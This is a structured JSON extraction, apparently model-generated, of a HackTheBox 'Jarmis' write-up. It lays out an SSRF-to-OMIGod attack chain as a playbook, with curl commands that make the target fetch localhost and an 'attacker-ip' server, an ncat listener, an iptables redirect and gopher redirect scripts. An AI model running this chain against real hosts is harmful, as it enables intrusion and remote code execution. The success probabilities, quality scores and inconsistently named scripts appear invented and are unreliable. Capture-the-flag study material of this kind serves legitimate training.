{
  "writeup_id": "Htb_Jarmis",
  "scenario_fingerprint": {
    "scenario_name": "linux_jarm_fingerprinting_omigod",
    "primary_services": [
      "http",
      "ssh",
      "winrm_omi"
    ],
    "port_signature": "22+80+5985+5986",
    "service_combination": "ssh+nginx+omi_winrm",
    "os_family": "linux",
    "environment_type": "web_application",
    "entry_vector": "jarm_service_abuse",
    "privilege_path": "service_abuse_to_root",
    "attack_complexity": "medium",
    "estimated_time": "90-120 minutes",
    "scenario_confidence": 0.88,
    "distinguishing_factors": [
      "jarm_fingerprinting_service",
      "omi_on_linux_host",
      "gopher_redirect_capability",
      "internal_port_scanning_via_service"
    ],
    "environmental_clues": [
      "nginx_web_server",
      "ubuntu_20.04_focal",
      "jarm_api_endpoint",
      "winrm_ports_on_linux"
    ],
    "similar_scenarios": [
      "forge_htb_medium",
      "worker_htb_medium"
    ],
    "unique_aspects": [
      "jarm_tls_fingerprinting_abuse",
      "omigod_vulnerability",
      "metasploit_custom_module",
      "iptables_redirect_technique"
    ]
  },
  "success_patterns": {
    "success_factors": [
      {
        "technique": "JARM_Service_Abuse",
        "success_reason": "JARM fingerprinting service performed GET requests to servers flagged as malicious",
        "prerequisite_indicators": [
          "jarm_service_accessible",
          "service_performs_http_requests",
          "localhost_services_available"
        ],
        "recognition_patterns": [
          "jarm fingerprinting endpoint available",
          "service makes outbound connections",
          "malicious signature triggers additional requests"
        ],
        "failure_modes": [
          "no_outbound_connectivity",
          "service_doesnt_follow_redirects",
          "localhost_services_blocked"
        ],
        "environmental_factors": [
          "web_service_with_ssrf_potential",
          "internal_services_on_localhost",
          "insufficient_input_validation"
        ],
        "success_probability": 0.75,
        "typical_timeframe": "15-30 minutes"
      },
      {
        "technique": "Port_Scanning_via_JARM",
        "success_reason": "JARM service error responses revealed open/closed port status on localhost",
        "prerequisite_indicators": [
          "jarm_service_responds_differently_to_open_closed_ports",
          "localhost_accessible_from_service",
          "error_messages_leak_information"
        ],
        "recognition_patterns": [
          "different responses for open vs closed ports",
          "connection timeout vs connection refused",
          "service attempts multiple connections"
        ],
        "failure_modes": [
          "uniform_error_responses",
          "localhost_access_blocked",
          "no_internal_services"
        ],
        "environmental_factors": [
          "verbose_error_handling",
          "internal_network_access",
          "service_runs_with_network_privileges"
        ],
        "success_probability": 0.65,
        "typical_timeframe": "10-20 minutes"
      },
      {
        "technique": "OMIGod_Exploitation",
        "success_reason": "OMI service listening on WinRM ports 5985/5986 was vulnerable to authentication bypass",
        "prerequisite_indicators": [
          "omi_service_running",
          "winrm_ports_accessible",
          "vulnerable_omi_version"
        ],
        "recognition_patterns": [
          "ports 5985/5986 open on linux system",
          "omi service fingerprint",
          "authentication bypass possible"
        ],
        "failure_modes": [
          "omi_patched",
          "ports_not_accessible",
          "service_not_running"
        ],
        "environmental_factors": [
          "unpatched_omi_installation",
          "default_omi_configuration",
          "linux_system_with_omi"
        ],
        "success_probability": 0.9,
        "typical_timeframe": "5-15 minutes"
      },
      {
        "technique": "Gopher_Protocol_Redirect",
        "success_reason": "Service followed HTTP redirects including gopher protocol for raw TCP communication",
        "prerequisite_indicators": [
          "service_follows_redirects",
          "gopher_protocol_supported",
          "raw_tcp_communication_possible"
        ],
        "recognition_patterns": [
          "http service follows 302 redirects",
          "gopher:// urls accepted",
          "raw tcp data transmission"
        ],
        "failure_modes": [
          "gopher_protocol_blocked",
          "no_redirect_following",
          "protocol_whitelist_enforced"
        ],
        "environmental_factors": [
          "permissive_url_handling",
          "legacy_protocol_support",
          "insufficient_protocol_filtering"
        ],
        "success_probability": 0.6,
        "typical_timeframe": "20-45 minutes"
      }
    ],
    "critical_discoveries": [
      {
        "discovery": "JARM service performs additional HTTP requests",
        "discovery_method": "Testing JARM fingerprinting with controlled server",
        "why_critical": "Enabled SSRF-like attacks and port scanning of localhost",
        "how_to_recognize": [
          "service makes outbound connections",
          "additional requests after jarm calculation",
          "malicious signature database triggers"
        ],
        "follow_up_actions": [
          "scan_localhost_ports",
          "identify_internal_services",
          "craft_malicious_redirects"
        ]
      },
      {
        "discovery": "Ports 5985/5986 open on localhost",
        "discovery_method": "Port scanning via JARM service error responses",
        "why_critical": "WinRM ports on Linux indicated OMI service vulnerability",
        "how_to_recognize": [
          "winrm ports on linux system",
          "omi service fingerprints",
          "unusual port combinations"
        ],
        "follow_up_actions": [
          "test_omigod_vulnerability",
          "craft_gopher_exploit",
          "prepare_reverse_shell"
        ]
      },
      {
        "discovery": "OMI service vulnerable to OMIGod",
        "discovery_method": "Service identification and vulnerability research",
        "why_critical": "Authentication bypass leading to remote code execution",
        "how_to_recognize": [
          "omi service version",
          "authentication bypass behavior",
          "cve-2021-38647 indicators"
        ],
        "follow_up_actions": [
          "prepare_omigod_exploit",
          "setup_reverse_shell_listener",
          "craft_exploitation_payload"
        ]
      }
    ],
    "escalation_keys": [
      {
        "privilege_level": "web_service_user",
        "escalation_method": "SSRF_to_localhost_services",
        "why_possible": "JARM service made HTTP requests to flagged malicious servers",
        "recognition_signs": [
          "service_makes_outbound_requests",
          "localhost_services_accessible",
          "redirect_following_enabled"
        ],
        "exploitation_path": "JARM Request → Malicious Signature → HTTP GET → Gopher Redirect → OMI Exploit"
      },
      {
        "privilege_level": "localhost_access",
        "escalation_method": "OMIGod_authentication_bypass",
        "why_possible": "OMI service vulnerable to CVE-2021-38647 authentication bypass",
        "recognition_signs": [
          "omi_service_running",
          "vulnerable_version",
          "authentication_bypass_possible"
        ],
        "exploitation_path": "Gopher Protocol → Raw TCP → OMI Exploit → Remote Code Execution"
      }
    ]
  },
  "decision_tree": {
    "decision_points": [
      {
        "step": 1,
        "situation": "Found HTTP service with JARM fingerprinting application",
        "decision": "Test JARM fetch functionality for SSRF potential",
        "reasoning": "JARM service makes outbound TLS connections to user-provided endpoints",
        "confidence": 0.9,
        "alternatives": [
          {
            "option": "directory_enumeration",
            "when": "if SSRF fails"
          },
          {
            "option": "parameter_fuzzing",
            "when": "if other endpoints found"
          }
        ],
        "success_indicators": [
          "outbound_connections_observed",
          "localhost_scanning_possible",
          "internal_services_discovered"
        ],
        "next_decision": "exploit_ssrf_for_port_scanning"
      },
      {
        "step": 2,
        "situation": "SSRF confirmed via JARM fetch functionality",
        "decision": "Use JARM as port scanner against localhost",
        "reasoning": "JARM makes multiple connection attempts, revealing open ports",
        "confidence": 0.85,
        "prerequisites": [
          "ssrf_confirmed",
          "jarm_endpoint_accessible"
        ],
        "success_indicators": [
          "different_responses_per_port",
          "port_enumeration_successful"
        ],
        "failure_fallbacks": [
          "external_service_enumeration",
          "parameter_manipulation"
        ]
      },
      {
        "step": 3,
        "situation": "Found ports 5985/5986 open on Linux host",
        "decision": "Investigate OMI service instead of WinRM",
        "reasoning": "WinRM ports on Linux indicate OMI service, potentially vulnerable to OMIGod",
        "confidence": 0.95,
        "prerequisites": [
          "ports_5985_5986_discovered",
          "linux_host_confirmed"
        ],
        "success_indicators": [
          "omi_service_confirmed",
          "omigod_vulnerability_present"
        ],
        "next_decision": "exploit_omigod_vulnerability"
      },
      {
        "step": 4,
        "situation": "OMIGod vulnerability confirmed",
        "decision": "Convert OMIGod exploit to work through JARM SSRF",
        "reasoning": "Need to chain SSRF with OMIGod exploit using protocol redirection",
        "confidence": 0.8,
        "prerequisites": [
          "omigod_poc_available",
          "ssrf_confirmed",
          "gopher_protocol_supported"
        ],
        "success_indicators": [
          "exploit_payload_delivered",
          "command_execution_achieved"
        ],
        "alternatives": [
          {
            "option": "direct_exploitation",
            "when": "if direct access possible"
          },
          {
            "option": "metasploit_module",
            "when": "if custom payload needed"
          }
        ]
      }
    ],
    "branching_logic": {
      "if_ssrf_discovered": {
        "action": "enumerate_internal_services",
        "tools": [
          "jarm_fetch",
          "port_scanning"
        ],
        "next_phase": "internal_service_identification"
      },
      "if_omi_ports_found": {
        "action": "test_omigod_vulnerability",
        "purpose": "achieve_remote_code_execution",
        "tools": [
          "custom_exploit",
          "gopher_protocol"
        ]
      },
      "if_omigod_confirmed": {
        "action": "chain_ssrf_with_omigod",
        "method": "gopher_protocol_redirection",
        "tools": [
          "metasploit",
          "iptables_redirect",
          "custom_server"
        ]
      }
    },
    "optimization_rules": [
      {
        "rule": "always_test_ssrf_on_outbound_connection_services",
        "reasoning": "services_that_fetch_external_content_often_vulnerable",
        "applicability": "jarm_fingerprinting_or_similar_services"
      },
      {
        "rule": "investigate_unusual_port_service_combinations",
        "reasoning": "winrm_ports_on_linux_indicate_omi_service",
        "applicability": "cross_platform_service_discovery"
      },
      {
        "rule": "use_protocol_redirection_for_ssrf_exploitation",
        "reasoning": "gopher_protocol_enables_arbitrary_tcp_payloads",
        "applicability": "ssrf_to_binary_protocol_exploitation"
      }
    ]
  },
  "applicability_rules": {
    "technique_rules": [
      {
        "technique": "JARM_Port_Scanner_Abuse",
        "mitre_id": "T1046",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "jarm_fingerprinting_service",
          "web_application_with_fetch_functionality",
          "localhost_scanning_capability"
        ],
        "success_indicators": [
          "jarm_service_responds_to_queries",
          "fetch_endpoint_accessible",
          "localhost_port_enumeration_possible"
        ],
        "incompatible_with": [
          "strict_input_validation",
          "network_segmentation",
          "localhost_access_blocked"
        ],
        "confidence_boosters": [
          "jarm_signature_database_present",
          "automated_metadata_collection",
          "gopher_protocol_support"
        ],
        "typical_success_rate": 0.75,
        "estimated_time": "10-30 minutes"
      },
      {
        "technique": "OMIGod_Exploitation",
        "mitre_id": "T1190",
        "required_services": [
          "omi"
        ],
        "required_ports": [
          5985,
          5986
        ],
        "os_requirements": [
          "linux"
        ],
        "environmental_prerequisites": [
          "omi_service_running",
          "vulnerable_omi_version",
          "winrm_ports_accessible"
        ],
        "success_indicators": [
          "ports_5985_5986_open",
          "omi_service_detected",
          "linux_host_with_winrm_ports"
        ],
        "incompatible_with": [
          "omi_patched",
          "ports_filtered",
          "authentication_required"
        ],
        "confidence_boosters": [
          "linux_system_unusual_winrm_ports",
          "omi_default_configuration",
          "azure_related_services"
        ],
        "typical_success_rate": 0.92,
        "estimated_time": "5-20 minutes"
      },
      {
        "technique": "Gopher_Protocol_SSRF",
        "mitre_id": "T1190",
        "required_services": [
          "http",
          "https"
        ],
        "required_ports": [
          80,
          443
        ],
        "os_requirements": [
          "linux",
          "windows"
        ],
        "environmental_prerequisites": [
          "ssrf_vulnerable_endpoint",
          "gopher_protocol_support",
          "internal_service_access"
        ],
        "success_indicators": [
          "gopher_requests_processed",
          "internal_port_access_gained",
          "custom_payload_delivery"
        ],
        "incompatible_with": [
          "protocol_whitelist_enforced",
          "gopher_blocked",
          "strict_url_validation"
        ],
        "confidence_boosters": [
          "curl_based_backend",
          "minimal_input_sanitization",
          "internal_network_exposure"
        ],
        "typical_success_rate": 0.68,
        "estimated_time": "15-45 minutes"
      }
    ],
    "environmental_detectors": {
      "jarm_service": {
        "port_indicators": [
          80,
          443
        ],
        "service_indicators": [
          "http",
          "nginx",
          "apache"
        ],
        "banner_indicators": [
          "jarm",
          "fingerprint",
          "tls"
        ],
        "confidence_threshold": 0.8
      },
      "omi_service": {
        "port_indicators": [
          5985,
          5986
        ],
        "service_indicators": [
          "winrm",
          "omi"
        ],
        "banner_indicators": [
          "Microsoft HTTPAPI",
          "OMI"
        ],
        "confidence_threshold": 0.85
      },
      "ssrf_vulnerable_app": {
        "port_indicators": [
          80,
          443,
          8080
        ],
        "service_indicators": [
          "http",
          "https"
        ],
        "technology_indicators": [
          "fetch",
          "curl",
          "wget"
        ],
        "confidence_threshold": 0.75
      }
    },
    "attack_prioritization": {
      "high_priority": [
        {
          "attack": "omigod_exploitation",
          "when": "ports_5985_5986_detected_linux",
          "reason": "high_success_rate_rce_available"
        },
        {
          "attack": "jarm_port_scanner_abuse",
          "when": "jarm_service_detected",
          "reason": "unique_attack_vector_internal_enumeration"
        }
      ],
      "medium_priority": [
        {
          "attack": "gopher_ssrf_exploitation",
          "when": "ssrf_endpoint_identified",
          "reason": "versatile_but_requires_payload_crafting"
        }
      ]
    }
  },
  "technique_intelligence": {
    "techniques": [
      {
        "name": "JARM Fingerprinting for Port Discovery",
        "mitre_id": "T1046",
        "category": "discovery",
        "phase": "reconnaissance",
        "tools_used": [
          {
            "name": "ncat",
            "command_template": "nc --ssl -lnvkp {port}",
            "actual_command": "nc --ssl -lnvkp 443",
            "output_pattern": "Connection from {target_ip}",
            "effectiveness_rating": 4,
            "reliability": 0.9
          },
          {
            "name": "JARM API",
            "command_template": "POST /api/v1/fetch?endpoint=https://{target}:{port}",
            "actual_command": "POST /api/v1/fetch?endpoint=https://10.10.14.6:443",
            "output_pattern": "{\"sig\": \"{jarm_signature}\", \"ismalicious\": {boolean}}",
            "effectiveness_rating": 5,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "jarm_service_accessible",
          "target_accepts_tls_connections",
          "controlled_server_for_testing"
        ],
        "success_indicators": [
          "multiple_tls_connections_received",
          "jarm_signature_generated",
          "service_fingerprint_obtained"
        ],
        "common_failures": [
          "tls_handshake_failures",
          "connection_timeout",
          "incomplete_jarm_scan"
        ],
        "follow_up_techniques": [
          "port_scanning_via_jarm",
          "service_enumeration",
          "localhost_port_discovery"
        ],
        "time_investment": "5-15 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "SSRF via JARM Fetch",
        "mitre_id": "T1190",
        "category": "initial_access",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "JARM Fetch API",
            "command_template": "/api/v1/fetch?endpoint={protocol}://{target}:{port}",
            "actual_command": "/api/v1/fetch?endpoint=https://127.0.0.1:5985",
            "output_pattern": "Internal service response or connection data",
            "effectiveness_rating": 4,
            "reliability": 0.85
          }
        ],
        "prerequisites": [
          "jarm_fetch_functionality_available",
          "internal_services_accessible",
          "ssrf_not_filtered"
        ],
        "success_indicators": [
          "internal_port_responses",
          "service_identification_successful",
          "localhost_enumeration_complete"
        ],
        "common_failures": [
          "request_filtering_active",
          "internal_services_unavailable",
          "protocol_restrictions"
        ],
        "follow_up_techniques": [
          "omigod_exploitation",
          "winrm_service_abuse",
          "gopher_protocol_redirect"
        ],
        "time_investment": "10-30 minutes",
        "skill_level": "intermediate"
      },
      {
        "name": "OMIGod Exploitation via Gopher",
        "mitre_id": "T1210",
        "category": "lateral_movement",
        "phase": "exploitation",
        "tools_used": [
          {
            "name": "Custom Gopher Server",
            "command_template": "python3 gopher_redirect.py --port {port} --payload {omigod_payload}",
            "actual_command": "python3 gopher_redirect.py --port 443 --payload omigod_rce.txt",
            "output_pattern": "Gopher redirect successful",
            "effectiveness_rating": 5,
            "reliability": 0.9
          },
          {
            "name": "iptables redirect",
            "command_template": "iptables -t nat -A PREROUTING -p tcp --dport {port} -j REDIRECT --to-port {target_port}",
            "actual_command": "iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port 5985",
            "output_pattern": "Traffic redirected successfully",
            "effectiveness_rating": 4,
            "reliability": 0.95
          }
        ],
        "prerequisites": [
          "omi_service_running_on_target",
          "ports_5985_5986_accessible",
          "gopher_protocol_support",
          "omigod_vulnerability_present"
        ],
        "success_indicators": [
          "command_execution_achieved",
          "reverse_shell_obtained",
          "system_compromise_successful"
        ],
        "common_failures": [
          "omi_service_patched",
          "gopher_protocol_blocked",
          "payload_encoding_issues"
        ],
        "follow_up_techniques": [
          "privilege_escalation",
          "persistence_establishment",
          "lateral_movement"
        ],
        "time_investment": "30-60 minutes",
        "skill_level": "advanced"
      }
    ],
    "tool_effectiveness": [
      {
        "tool": "ncat",
        "use_case": "tls_server_simulation",
        "effectiveness_rating": 4,
        "reliability": 0.9,
        "learning_curve": "low",
        "essential_for": [
          "tls_testing",
          "jarm_fingerprinting"
        ],
        "alternatives": [
          "openssl_s_server",
          "custom_tls_server"
        ],
        "best_practices": [
          "use_ssl_flag_for_tls",
          "use_k_flag_for_multiple_connections",
          "monitor_connection_patterns"
        ]
      },
      {
        "tool": "feroxbuster",
        "use_case": "web_directory_enumeration",
        "effectiveness_rating": 4,
        "reliability": 0.95,
        "learning_curve": "low",
        "essential_for": [
          "web_reconnaissance"
        ],
        "alternatives": [
          "gobuster",
          "dirbuster",
          "ffuf"
        ],
        "best_practices": [
          "use_appropriate_wordlists",
          "adjust_thread_count_for_target",
          "check_recursive_depth_settings"
        ]
      }
    ],
    "command_sequences": [
      {
        "sequence_name": "jarm_to_omigod_exploitation",
        "steps": [
          {
            "step": 1,
            "command": "nc --ssl -lnvkp 443",
            "purpose": "Set up TLS listener for JARM testing",
            "expected_output": "Multiple TLS connection attempts from target"
          },
          {
            "step": 2,
            "command": "curl -X POST 'http://jarmis.htb/api/v1/fetch?endpoint=https://127.0.0.1:5985'",
            "purpose": "Enumerate internal services via JARM SSRF",
            "expected_output": "JARM signature indicating WinRM/OMI service"
          },
          {
            "step": 3,
            "command": "python3 gopher_server.py --target-port 5985 --omigod-payload",
            "purpose": "Create malicious server for OMIGod exploitation",
            "expected_output": "Gopher server ready for redirect"
          },
          {
            "step": 4,
            "command": "curl -X POST 'http://jarmis.htb/api/v1/fetch?endpoint=https://attacker-ip:443'",
            "purpose": "Trigger JARM fetch to malicious server",
            "expected_output": "Command execution on target system"
          }
        ],
        "success_rate": 0.75,
        "typical_duration": "45-90 minutes"
      }
    ]
  },
  "metadata": {
    "basic_metadata": {
      "name": "Jarmis",
      "difficulty": "Medium",
      "os": "Linux",
      "platform": "HackTheBox",
      "release_date": "2021-09-27",
      "author": "ippsec, waldo",
      "estimated_time": "90-120 minutes"
    },
    "intelligence_metadata": {
      "attack_complexity": "medium",
      "skill_level_required": "intermediate",
      "primary_attack_vectors": [
        "ssrf",
        "protocol_abuse",
        "service_exploitation"
      ],
      "key_vulnerabilities": [
        "jarm_fingerprinting_abuse",
        "omigod_vulnerability",
        "ssrf_via_redirect"
      ],
      "environment_type": "linux_web_application",
      "real_world_relevance": "high",
      "learning_value": [
        "jarm_fingerprinting",
        "gopher_protocol",
        "omi_exploitation",
        "ssrf_techniques"
      ],
      "prerequisite_knowledge": [
        "tls_handshakes",
        "http_redirects",
        "protocol_fundamentals",
        "ssrf_concepts"
      ]
    },
    "categorization": {
      "primary_category": "web_exploitation",
      "subcategories": [
        "ssrf",
        "protocol_manipulation",
        "service_exploitation"
      ],
      "attack_types": [
        "server_side_request_forgery",
        "remote_code_execution",
        "information_disclosure"
      ],
      "defensive_lessons": [
        "validate_redirect_targets",
        "patch_omi_services",
        "restrict_internal_access",
        "monitor_unusual_protocols"
      ]
    },
    "similarity_markers": {
      "similar_boxes": [
        "Pit",
        "Breadcrumbs",
        "Schooled"
      ],
      "similarity_reasons": [
        "ssrf_exploitation",
        "protocol_abuse",
        "chained_vulnerabilities"
      ],
      "unique_aspects": [
        "jarm_fingerprinting_technology",
        "gopher_redirect_technique",
        "omigod_exploitation"
      ],
      "difficulty_factors": [
        "complex_attack_chain",
        "protocol_understanding_required",
        "custom_exploit_development"
      ]
    }
  },
  "extraction_metadata": {
    "parse_date": "2025-07-04T01:13:09.913865",
    "original_file": "0xdf_writeups/Htb Jarmis.md",
    "content_length": 54859,
    "extraction_version": "2.0-claude",
    "model_used": "claude-sonnet-4-20250514"
  },
  "intelligence_confidence": 1.0,
  "quality_breakdown": {
    "scenario_uniqueness": 1.0,
    "success_logic_clarity": 1.0,
    "applicability_completeness": 1.0,
    "decision_tree_depth": 1.0,
    "technique_actionability": 1.0
  }
}